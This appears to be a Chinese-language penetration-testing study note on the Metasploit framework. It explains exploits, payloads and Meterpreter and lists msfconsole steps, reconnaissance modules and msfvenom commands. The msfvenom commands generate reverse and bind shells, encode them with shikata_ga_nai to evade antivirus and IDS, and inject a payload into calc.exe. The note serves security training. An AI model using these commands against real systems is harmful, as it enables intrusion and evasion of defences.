- 最主流的弱點利用平台，由 Rapid7 維護，支援 Windows/Linux/macOS
- 包含大量 exploit、payload、掃描工具
- CLI 工具為 `msfconsole`，GUI 工具有 Armitage、Web UI

## 🔧 主要元件 ＆ 架構

| 元件              | 說明                    |
| --------------- | --------------------- |
| **exploit**     | 攻擊程式，針對特定漏洞           |
| **payload**     | 攻擊成功後執行程式（如反向 shell）  |
| **shellcode**   | 編碼的 payload 指令        |
| **listener**    | 攻擊端監聽連線               |
| **module**      | 弱點模組、輔助模組等            |
| **meterpreter** | 高互動性 payload，可完全操控受害端 |
![[07_Penetration Testing Practice_弱點利用平台_v1.0.pdf#page=23&rect=154,33,809,461|07_Penetration Testing Practice_弱點利用平台_v1.0, p.23]]
## 🧪 常見操作指令

### msfconsole

```
# 搜尋模組
search <vulnerbility>
// search exploit samba

# 載入模組
use <module>
// use exploit/linux/samba/...

# 參考模組設定
show options

# 設定參數
set <options> <value>
// set RHOSTS <目標IP> 
// set PAYLOAD <payload類型> 
// set LHOST <攻擊者IP>  

# 執行攻擊
exploit
```

### searchsploit
https://www.exploit-db.com/searchsploit

### Msfvenom (msfpayload & msfencode)
- msfpayload 工具：
- 用於產生shellcode，可生成C、Ruby、JaveScript、VB 格式的shellcode 
- msfencode 工具：
	- 用於編碼或壓縮shellcode，以避過IDS、防火牆或防毒軟體 
	- 常用效果較佳的編碼方式(encoders)是x86/shikata_ga_nai

```
# Example 1: 列出payloads:
msfvenom -l payloads

# Example 2: 產出 windows/meterpreter/reverse_tcp:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe

# Example 3: 產出 payload 加上避免偵測的編碼(avoids certain bad characters):
msfvenom -p windows/meterpreter/bind_tcp -b '\x00' 

# Example 4: 產出 payload在使用特定 encode 3 次: 
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 

# Example 5: 注入payload到calc.exe 並另存成的new.exe： 
msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe
```

### Intelligence Gathering（資安偵查模組）

|功能|模組範例|
|---|---|
|Port Scan|auxiliary/scanner/portscan/tcp|
|服務掃描|ftp_version、smb_version、ssh_version|
|匿名登入掃描|ftp_anonymous、snmp_login|
|Web 偵查|http_title、wordpress_pingback_access|

## Example: Autopwn

![[07_Penetration Testing Practice_弱點利用平台_v1.0.pdf#page=37&rect=102,67,841,464|07_Penetration Testing Practice_弱點利用平台_v1.0, p.37]]

